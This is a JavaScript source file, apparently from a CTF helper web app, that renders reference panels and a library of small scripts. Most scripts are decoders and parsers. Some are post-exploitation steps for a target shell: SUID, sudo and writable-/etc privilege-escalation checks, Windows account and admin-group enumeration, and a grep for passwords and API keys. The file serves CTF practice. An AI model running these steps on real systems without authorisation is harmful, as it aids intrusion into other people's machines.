  document.querySelectorAll('.eref-tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.eref-panel').forEach(p=>p.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('eref-'+tab).classList.add('active');
}

function togglePortCard(el){ el.closest('.port-card').classList.toggle('open'); }

function renderPortGrid(){
  const q=(document.getElementById('portSearch')?.value||'').trim().toLowerCase();
  const grid=document.getElementById('portGrid');
  if(!grid)return;
  const filtered=PORT_REFERENCE.filter(p=>!q||String(p.port).includes(q)||p.service.toLowerCase().includes(q)||p.why.toLowerCase().includes(q));
  if(!filtered.length){grid.innerHTML='<div class="ci-empty-state">No matching ports.</div>';return;}
  grid.innerHTML=filtered.map(p=>`
    <div class="port-card" id="portcard-${p.port}">
      <div class="port-card-head" onclick="togglePortCard(this)">
        <span class="port-num">${p.port}</span>
        <span class="port-proto">${escHtml(p.proto)}</span>
        <span class="port-svc">${escHtml(p.service)}</span>
        <span class="port-meaning-preview">${escHtml(p.why)}</span>
        <span class="port-chevron">&#9660;</span>
      </div>
      <div class="port-card-body">
        <div class="port-body-section"><div class="port-body-label">Why</div><div class="port-body-text">${escHtml(p.why)}</div></div>
        <div class="port-body-section"><div class="port-body-label">First command</div><div class="port-first-cmd"><span>${escHtml(p.firstCmd)}</span><button class="copy-btn" onclick="event.stopPropagation();copyText(${JSON.stringify(p.firstCmd)},this)">Copy</button></div></div>
        <div class="port-body-section"><div class="port-body-label">Check</div><div class="port-tool-chips">${p.check.map(c=>`<span class="port-tool-chip">${escHtml(c)}</span>`).join('')}</div></div>
        <div class="port-body-section"><div class="port-body-label">Tools</div><div class="port-tool-chips">${p.tools.map(t=>`<span class="port-tool-chip">${escHtml(t)}</span>`).join('')}</div></div>
        <div class="port-body-section"><div class="port-body-label">Next</div><div class="port-body-text">${escHtml(p.next)}</div></div>
      </div>
    </div>`).join('');
}

function renderFileSigTable(){
  const q=(document.getElementById('fileSigSearch')?.value||'').trim().toLowerCase().replace(/0x/g,'');
  const body=document.getElementById('fileSigBody');
  if(!body)return;
  const filtered=FILE_SIGNATURES.filter(s=>!q||s.hex.toLowerCase().replace(/\s/g,'').includes(q.replace(/\s/g,''))||s.ext.toLowerCase().includes(q)||s.note.toLowerCase().includes(q));
  body.innerHTML=filtered.map(s=>`<tr><td class="sig-hex">${escHtml(s.hex)}</td><td class="sig-ext">${escHtml(s.ext)}</td><td style="font-family:var(--mono);font-size:11px;">${escHtml(s.mime)}</td><td>${escHtml(s.note)}</td></tr>`).join('');
}

function renderEncodingGrid(){
  const grid=document.getElementById('encodingGrid');
  if(!grid)return;
  grid.innerHTML=ENCODING_REFERENCE.map(e=>`
    <div class="tool-card">
      <div class="tool-card-head"><span class="tool-card-name">${escHtml(e.name)}</span></div>
      <p class="tool-card-desc"><strong>Identify:</strong> ${escHtml(e.identify)}</p>
      <div class="tool-card-why"><span class="tcw-label">When</span>${escHtml(e.when)}</div>
      <div class="cmd-example" style="margin-top:.5rem;">${escHtmlPre(e.cmd)}<div class="cmd-example-actions"><button class="cmd-copy-btn" onclick="copyText(${JSON.stringify(e.cmd)},this)">Copy command</button></div></div>
      <div class="tool-card-tips" style="margin-top:.4rem;"><span class="tcw-label">Tool</span>${escHtml(e.tool)}</div>
    </div>`).join('');
}

function renderCommandRef(){
  const renderGroup=(groups)=>groups.map(g=>`
    <div class="cmdref-group">
      <div class="cmdref-group-title">${escHtml(g.group)}</div>
      ${g.items.map(it=>`<div class="cmdref-item"><span class="cmdref-cmd" onclick="copyText(${JSON.stringify(it.cmd)},this)">${escHtml(it.cmd)}</span><span class="cmdref-desc">${escHtml(it.desc)}</span></div>`).join('')}
    </div>`).join('');
  const lx=document.getElementById('cmdrefLinux');
  const wn=document.getElementById('cmdrefWindows');
  if(lx)lx.innerHTML=renderGroup(COMMAND_REFERENCE.linux);
  if(wn)wn.innerHTML=renderGroup(COMMAND_REFERENCE.windows);
}

function indexEmergencyReference(){
  if(typeof registerSearchableBulk!=='function')return;
  registerSearchableBulk(PORT_REFERENCE.map(p=>({type:'reference',title:`Port ${p.port} â€” ${p.service}`,keywords:[String(p.port),p.service,p.proto,p.why,...p.check,...p.tools],pageId:'emergencyref',snippet:p.why})));
  registerSearchableBulk(FILE_SIGNATURES.map(s=>({type:'reference',title:`File signature â€” ${s.ext}`,keywords:[s.hex,s.ext,s.mime,s.note],pageId:'emergencyref',snippet:s.note})));
  registerSearchableBulk(ENCODING_REFERENCE.map(e=>({type:'reference',title:`Encoding â€” ${e.name}`,keywords:[e.name,e.identify,e.when],pageId:'emergencyref',snippet:e.when})));
  ['linux','windows'].forEach(os=>{COMMAND_REFERENCE[os].forEach(g=>{g.items.forEach(it=>{registerSearchableBulk([{type:'command',title:it.cmd,keywords:[it.desc,g.group,os],pageId:'emergencyref',snippet:it.desc}]);});});});
}

function renderEmergencyReference(){
  renderPortGrid();
  renderFileSigTable();
  renderEncodingGrid();
  renderCommandRef();
  indexEmergencyReference();
}


function renderDashboard(){

  const statsEl=document.getElementById('dashStats');
  if(statsEl){
    const toolCount = typeof TOOLS_DATA!=='undefined' ? Object.values(TOOLS_DATA).reduce((sum,arr)=>sum+arr.length,0) : 0;
    const portCount = typeof PORT_REFERENCE!=='undefined' ? PORT_REFERENCE.length : 0;
    const noteCount = loadNotes().length;
    const board = loadBoard();
    const openTasks = board.filter(c=>c.status!=='Solved').length;
    statsEl.innerHTML = `
      <div class="dash-stat" onclick="goToPage('utilities')"><div class="dash-stat-num">${toolCount}</div><div class="dash-stat-label">Tools indexed</div></div>
      <div class="dash-stat" onclick="goToPage('emergencyref')"><div class="dash-stat-num">${portCount}</div><div class="dash-stat-label">Ports referenced</div></div>
      <div class="dash-stat" onclick="toggleNotes()"><div class="dash-stat-num">${noteCount}</div><div class="dash-stat-label">Notes saved</div></div>
      <div class="dash-stat" onclick="goToPage('taskboard')"><div class="dash-stat-num">${openTasks}</div><div class="dash-stat-label">Open tasks</div></div>
    `;
  }


  const boardEl=document.getElementById('dashBoardMini');
  if(boardEl){
    const board=loadBoard();
    if(!board.length){
      boardEl.innerHTML='<div class="dash-empty">No challenges tracked yet. Open the Task Board to add one.</div>';
    }else{
      const statuses=['Untouched','Working','Stuck','Solved'];
      boardEl.innerHTML=statuses.map(s=>{
        const n=board.filter(c=>c.status===s).length;
        return `<div class="dash-board-chip" onclick="goToPage('taskboard')"><b>${n}</b> ${escHtml(s)}</div>`;
      }).join('');
    }
  }


  const notesEl=document.getElementById('dashNotesPreview');
  if(notesEl){
    const notes=loadNotes().slice(0,3);
    if(!notes.length){
      notesEl.innerHTML='<div class="dash-empty">No notes yet. Click the pencil icon to start one.</div>';
    }else{
      notesEl.innerHTML=notes.map(n=>`<div class="dash-note-row" onclick="toggleNotes()"><span class="dash-note-title">${escHtml(n.title||'Untitled')}</span><span class="dash-note-date">${escHtml(n.date)}</span></div>`).join('');
    }
  }
}


const SCRIPTS_DATA = [
  {name:'Remove spaces & blank lines',category:'python',level:1,purpose:'Strip whitespace and blank lines from messy CTF text dumps.',when:'Cleaning up copy-pasted output before feeding it to another tool.',code:`with open('input.txt') as f:
    lines = [l.strip() for l in f if l.strip()]
with open('output.txt', 'w') as f:
    f.write('\\n'.join(lines))`,exIn:'input.txt with blank lines and trailing spaces',exOut:'output.txt, one clean line per entry'},
  {name:'Extract emails',category:'python',level:1,purpose:'Regex-pull every email address out of a text blob.',when:'OSINT recon on leaked documents or scraped pages.',code:`import re
text = open('data.txt').read()
emails = re.findall(r'[\\w.+-]+@[\\w-]+\\.[\\w.-]+', text)
print('\\n'.join(sorted(set(emails))))`,exIn:'data.txt containing mixed text and emails',exOut:'admin@target.com\\nuser@target.com'},
  {name:'Extract IP addresses',category:'python',level:1,purpose:'Pull all IPv4 addresses from logs or text.',when:'Parsing nmap output, logs, or PCAP-derived text dumps.',code:`import re
text = open('data.txt').read()
ips = re.findall(r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b', text)
print('\\n'.join(sorted(set(ips))))`,exIn:'access.log with mixed content',exOut:'10.10.10.5\\n192.168.1.1'},
  {name:'Generic regex search',category:'python',level:1,purpose:'Reusable regex grep â€” swap the pattern for anything.',when:'Any time you need custom pattern extraction not covered by other scripts.',code:`import re, sys
pattern = r'flag\\{.*?\\}'
text = open(sys.argv[1]).read()
for m in re.findall(pattern, text, re.IGNORECASE):
    print(m)`,exIn:'python3 regex_search.py dump.txt',exOut:'flag{example_match}'},
  {name:'Hash identifier',category:'python',level:1,purpose:'Guess hash type from length and charset before cracking.',when:'You have a hash and no idea what algorithm produced it.',code:`h = input('Hash: ').strip()
n = len(h)
guesses = {32:'MD5 / NTLM',40:'SHA-1',56:'SHA-224',64:'SHA-256',96:'SHA-384',128:'SHA-512'}
print(guesses.get(n, 'Unknown length â€” check for salt or non-hex encoding'))`,exIn:'5f4dcc3b5aa765d61d8327deb882cf99',exOut:'MD5 / NTLM'},
  {name:'Base64 encode/decode',category:'python',level:1,purpose:'Quick encode or decode without opening CyberChef.',when:'Fast one-off Base64 work in a terminal.',code:`import base64, sys
mode, data = sys.argv[1], sys.argv[2]
if mode == 'd':
    print(base64.b64decode(data).decode(errors='replace'))
else:
    print(base64.b64encode(data.encode()).decode())`,exIn:'python3 b64.py d SGVsbG8=',exOut:'Hello'},
  {name:'Hex decoder',category:'python',level:1,purpose:'Convert hex string to raw text.',when:'Decoding hex-dumped flags or crypto challenge output.',code:`h = input('Hex: ').strip().replace(' ', '')
print(bytes.fromhex(h).decode(errors='replace'))`,exIn:'68656c6c6f',exOut:'hello'},
  {name:'XOR single-byte solver',category:'python',level:2,purpose:'Brute-force all 256 XOR keys and print printable results.',when:'Crypto challenge ciphertext looks like random bytes.',code:`data = bytes.fromhex(input('Hex ciphertext: ').strip())
for key in range(256):
    out = bytes(b ^ key for b in data)
    try:
        s = out.decode('ascii')
        if s.isprintable():
            print(f'{key:3d} 0x{key:02x}: {s}')
    except UnicodeDecodeError:
        pass`,exIn:'1c0a0e1b4f1a4116',exOut:'List of key/plaintext pairs â€” scan for readable English'},
  {name:'Caesar / ROT brute-force',category:'python',level:2,purpose:'Try all 25 shifts, flag the ones containing common words.',when:'Text looks like a substitution cipher with a consistent shift.',code:`text = input('Ciphertext: ')
common = ('the', 'flag', 'and', 'is')
for shift in range(26):
    out = ''.join(
        chr((ord(c) - 65 + shift) % 26 + 65) if c.isupper() else
        chr((ord(c) - 97 + shift) % 26 + 97) if c.islower() else c
        for c in text
    )
    if any(w in out.lower() for w in common):
        print(f'shift {shift}: {out}')`,exIn:'synt{grfg}',exOut:'shift 13: flag{test}'},
  {name:'Vigenere decoder (known key)',category:'python',level:2,purpose:'Decrypt Vigenere ciphertext when you already know the key.',when:'Challenge gives you the key or you brute-forced it separately.',code:`def vigenere_decrypt(ct, key):
    out = []
    key = key.lower()
    ki = 0
    for c in ct:
        if c.isalpha():
            shift = ord(key[ki % len(key)]) - ord('a')
            base = 65 if c.isupper() else 97
            out.append(chr((ord(c) - base - shift) % 26 + base))
            ki += 1
        else:
            out.append(c)
    return ''.join(out)

print(vigenere_decrypt(input('Ciphertext: '), input('Key: ')))`,exIn:'ciphertext + key',exOut:'plaintext'},
  {name:'File metadata extractor',category:'python',level:1,purpose:'Dump EXIF/metadata without installing exiftool.',when:'Quick metadata check when exiftool is unavailable.',code:`from PIL import Image
from PIL.ExifTags import TAGS

img = Image.open('image.jpg')
exif = img._getexif() or {}
for tag_id, value in exif.items():
    tag = TAGS.get(tag_id, tag_id)
    print(f'{tag}: {value}')`,exIn:'image.jpg with EXIF data',exOut:'GPSInfo: {...}\\nSoftware: ...'},
  {name:'Simple log parser',category:'python',level:1,purpose:'Pull timestamps + IPs + status codes from an access log.',when:'Forensics challenge with a web server log to analyze.',code:`import re
pattern = r'(\\S+) - - \\[(.*?)\\] "(.*?)" (\\d+)'
with open('access.log') as f:
    for line in f:
        m = re.match(pattern, line)
        if m:
            ip, ts, req, status = m.groups()
            if status.startswith('4') or status.startswith('5'):
                print(ip, ts, req, status)`,exIn:'access.log (Apache combined format)',exOut:'Lines with 4xx/5xx status codes only'},
  {name:'JSON pretty parser / key search',category:'python',level:1,purpose:'Load JSON and search for a specific key anywhere in nested structure.',when:'API response or config dump is a wall of minified JSON.',code:`import json

def find_key(obj, target, path=''):
    if isinstance(obj, dict):
        for k, v in obj.items():
            p = f'{path}.{k}'
            if k == target:
                print(f'{p}: {v}')
            find_key(v, target, p)
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            find_key(v, target, f'{path}[{i}]')

data = json.load(open('data.json'))
find_key(data, 'flag')`,exIn:'data.json (nested)',exOut:'.user.metadata.flag: flag{...}'},
  {name:'CSV quick analyzer',category:'python',level:1,purpose:'Column stats and unique value counts without pandas.',when:'A dataset CTF challenge hands you a CSV and asks a question about it.',code:`import csv
from collections import Counter

with open('data.csv') as f:
    reader = csv.DictReader(f)
    rows = list(reader)

print(f'Rows: {len(rows)}')
print(f'Columns: {list(rows[0].keys())}')
col = input('Column to count values for: ')
print(Counter(r[col] for r in rows).most_common(10))`,exIn:'data.csv',exOut:'Top 10 most common values in chosen column'},
  {name:'IOC extractor (IPs, domains, hashes)',category:'python',level:2,purpose:'Pull Indicators of Compromise from a blob of threat-intel text.',when:'Forensics/threat-intel challenge with a report to mine.',code:`import re

text = open('report.txt').read()
iocs = {
    'ips': re.findall(r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b', text),
    'domains': re.findall(r'\\b[a-z0-9-]+\\.[a-z]{2,}\\b', text, re.I),
    'md5': re.findall(r'\\b[a-fA-F0-9]{32}\\b', text),
    'sha256': re.findall(r'\\b[a-fA-F0-9]{64}\\b', text),
}
for k, v in iocs.items():
    print(f'--- {k} ---')
    print('\\n'.join(sorted(set(v))))`,exIn:'report.txt',exOut:'Grouped, deduplicated IOC lists'},
  {name:'grep-style multi-pattern search',category:'bash',level:1,purpose:'Search a directory for several patterns at once.',when:'Hunting for creds/flags across an extracted archive.',code:`grep -rEn "password|flag\\{|api[_-]?key" ./extracted/ 2>/dev/null`,exIn:'./extracted/ directory from binwalk/unzip',exOut:'file:line matches for any of the patterns'},
  {name:'Mass file type scan',category:'bash',level:1,purpose:'Identify true file types for every file in a directory, ignoring extensions.',when:'A dump of files with wrong or missing extensions.',code:`find . -type f -exec file {} \\; | grep -v "ASCII text"`,exIn:'Directory of mixed unknown files',exOut:'List of files with their real detected type'},
  {name:'SUID/permission checker',category:'bash',level:1,purpose:'One-liner Linux privesc first-check.',when:'Just landed a shell, checking for easy privesc vectors.',code:`find / -perm -4000 -type f 2>/dev/null
echo "---sudo -l---"
sudo -l 2>/dev/null
echo "---writable /etc---"
find /etc -writable 2>/dev/null`,exIn:'(run directly on target shell)',exOut:'List of SUID binaries, sudo rights, writable /etc paths'},
  {name:'Quick network info gather',category:'bash',level:1,purpose:'Snapshot of network config in one command block.',when:'First minute after landing a Linux shell.',code:`echo "--- interfaces ---"; ip a
echo "--- routes ---"; ip r
echo "--- listening ---"; ss -tulnp
echo "--- arp ---"; arp -a 2>/dev/null`,exIn:'(run directly on target shell)',exOut:'Interfaces, routes, listening ports, ARP table'},
  {name:'Automation wrapper (loop + log)',category:'bash',level:2,purpose:'Template for running a command against a wordlist/target list with logging.',when:'You need to repeat an action across many targets and keep results.',code:`#!/bin/bash
TARGETS="targets.txt"
OUT="results.log"
> "$OUT"
while read -r t; do
  echo "[*] Testing $t" | tee -a "$OUT"
  curl -s -o /dev/null -w "%{http_code}\\n" "http://$t" >> "$OUT"
done < "$TARGETS"`,exIn:'targets.txt (one host per line)',exOut:'results.log with status code per target'},
  {name:'Windows enumeration snapshot',category:'powershell',level:1,purpose:'Pull user/priv/system info in one block.',when:'First minute after landing a Windows shell.',code:`whoami /all
Get-ComputerInfo | Select-Object OsName, OsVersion, CsDomain
Get-LocalUser | Select-Object Name, Enabled
Get-LocalGroupMember Administrators`,exIn:'(run in PowerShell on target)',exOut:'Current user privileges, OS info, local users, admin group members'},
  {name:'Process listing with owner',category:'powershell',level:1,purpose:'See what is running and who owns each process â€” spot anomalies.',when:'Looking for unusual processes or credential-holding services.',code:`Get-Process | Select-Object Id, ProcessName, Path |
  Sort-Object ProcessName | Format-Table -AutoSize`,exIn:'(run in PowerShell on target)',exOut:'Table of PID, name, and executable path'},
  {name:'Network info gather (PowerShell)',category:'powershell',level:1,purpose:'PowerShell equivalent of ipconfig/netstat in one script.',when:'Windows box, need network config and connections fast.',code:`Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias
Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess
Get-DnsClientServerAddress`,exIn:'(run in PowerShell on target)',exOut:'IPs, listening ports with owning PID, DNS servers'},
  {name:'Event log quick parser',category:'powershell',level:2,purpose:'Pull recent security/logon events without opening Event Viewer GUI.',when:'Forensics/Windows box challenge asking about login activity.',code:`Get-WinEvent -LogName Security -MaxEvents 50 |
  Where-Object { $_.Id -eq 4624 -or $_.Id -eq 4625 } |
  Select-Object TimeCreated, Id, Message |
  Format-Table -Wrap`,exIn:'(run in PowerShell on target)',exOut:'Recent successful (4624) and failed (4625) logon events'},
  {name:'JSON manipulation snippet',category:'javascript',level:1,purpose:'Parse, filter, and re-serialize JSON quickly in the browser console or Node.',when:'Working with API responses in a web challenge.',code:`const data = JSON.parse(rawText);
const filtered = data.filter(item => item.role === 'admin');
console.log(JSON.stringify(filtered, null, 2));`,exIn:'rawText = API response body',exOut:'Pretty-printed filtered JSON array'},
  {name:'Simple web data parser',category:'javascript',level:1,purpose:'Extract all links or data attributes from a page via console.',when:'Scraping structure from a challenge page in DevTools.',code:`const links = [...document.querySelectorAll('a')]
  .map(a => a.href)
  .filter(h => h.startsWith('http'));
console.log([...new Set(links)].join('\\n'));`,exIn:'Run in browser DevTools console on the target page',exOut:'Deduplicated list of all outbound links'},
  {name:'Base64 / atob-btoa helper',category:'javascript',level:1,purpose:'Quick encode/decode directly in browser console â€” no external tool needed.',when:'JWT or cookie value looks Base64-encoded mid-challenge.',code:`// decode
console.log(atob('SGVsbG8='));
// encode
console.log(btoa('Hello'));`,exIn:"atob('SGVsbG8=')",exOut:'Hello'}
];

function scriptRefCard(s){
  const io = (s.exIn||s.exOut) ? `<div class="scriptref-io">
      ${s.exIn?`<div class="scriptref-io-box"><div class="scriptref-io-label">Example input</div><div class="scriptref-io-val">${escHtml(s.exIn)}</div></div>`:''}
      ${s.exOut?`<div class="scriptref-io-box"><div class="scriptref-io-label">Example output</div><div class="scriptref-io-val">${escHtml(s.exOut)}</div></div>`:''}
    </div>` : '';
  return `<div class="scriptref-card">
    <div class="scriptref-head">
      <span class="scriptref-title">${escHtml(s.name)}</span>
      <div class="scriptref-badges">
        <span class="scriptref-badge lang-${s.category}">${s.category}</span>
        <span class="scriptref-badge level-${s.level}">Level ${s.level}</span>
      </div>
    </div>
    <div class="scriptref-purpose">${escHtml(s.purpose)}</div>
    <div class="scriptref-when"><span class="tcw-label">When</span>${escHtml(s.when)}</div>
    <div class="script-code-wrap"><pre class="script-code">${escHtmlPre(s.code)}</pre><button class="script-copy-btn" onclick="copyText(${JSON.stringify(s.code)},this)">Copy</button></div>
    ${io}
  </div>`;
}

function renderScriptRef(cat){
  cat = cat || 'all';
  const list = document.getElementById('scriptRefList');
  if(!list) return;
  const items = cat==='all' ? SCRIPTS_DATA : SCRIPTS_DATA.filter(s=>s.category===cat);
  list.innerHTML = items.map(scriptRefCard).join('');
}

function filterScriptRef(cat,btn){
  document.querySelectorAll('#scriptrefFilterBar .filter-btn').forEach(b=>b.classList.remove('active'));
  if(btn)btn.classList.add('active');
  renderScriptRef(cat);
}

function indexScriptRef(){
  if(typeof registerSearchableBulk!=='function')return;
  registerSearchableBulk(SCRIPTS_DATA.map(s=>({type:'command',title:s.name,keywords:[s.category,s.purpose,s.when],pageId:'scriptref',snippet:s.purpose})));
}


function indexDeepDives(){
  if(typeof registerSearchableBulk!=='function')return;
  registerSearchableBulk([
    {type:'reference',title:'Linux privilege escalation checklist',keywords:['linux','sudo -l','SUID','capabilities','cron','privesc'],pageId:'linux',snippet:'sudo -l, SUID binaries, capabilities, cron jobs, LinPEAS'},
    {type:'reference',title:'Linux filesystem & permissions',keywords:['linux','chmod','chown','ls -la','stat'],pageId:'linux',snippet:'chmod, chown, SUID search, file metadata'},
    {type:'reference',title:'Windows privilege escalation checklist',keywords:['windows','whoami /priv','systeminfo','service paths','winpeas'],pageId:'windows',snippet:'SeImpersonate, patch level CVEs, unquoted service paths, WinPEAS'},
    {type:'reference',title:'Windows PowerShell essentials',keywords:['windows','powershell','get-process','get-localuser'],pageId:'windows',snippet:'Get-Process, Get-LocalUser, Get-NetTCPConnection'},
    {type:'reference',title:'RDP connection steps',keywords:['rdp','xfreerdp','rdesktop','mstsc','remote desktop'],pageId:'rdp',snippet:'xfreerdp, rdesktop, mstsc connection commands'},
    {type:'reference',title:'RDP security checks',keywords:['rdp','nla','bluekeep','cve-2019-0708'],pageId:'rdp',snippet:'NLA disabled, weak creds, BlueKeep/DejaBlue CVEs'},
    {type:'reference',title:'pandas quick reference',keywords:['data analyst','pandas','dataframe','python'],pageId:'dataanalyst',snippet:'read_csv, describe, groupby, duplicated, isnull'},
    {type:'reference',title:'Data cleaning workflow',keywords:['data analyst','cleaning','anomaly','outlier'],pageId:'dataanalyst',snippet:'Inspect, dedupe, normalize, find anomalies'}
  ]);
}

function renderAll(){
  Object.entries(TOOLS_DATA).forEach(([id,tools])=>renderToolGrid(id,tools));
  buildAscii();buildMorse();renderNotes();renderTemplates('all');renderBoard();
  // build all trees
  Object.entries(TREE_DATA).forEach(([cat,data])=>buildTree('tree-'+cat,data));
  indexExistingTools();
  renderEmergencyReference();
  renderScriptRef('all');
  indexScriptRef();
  indexDeepDives();
  refreshCheatIndexCount();
  renderDashboard();
}
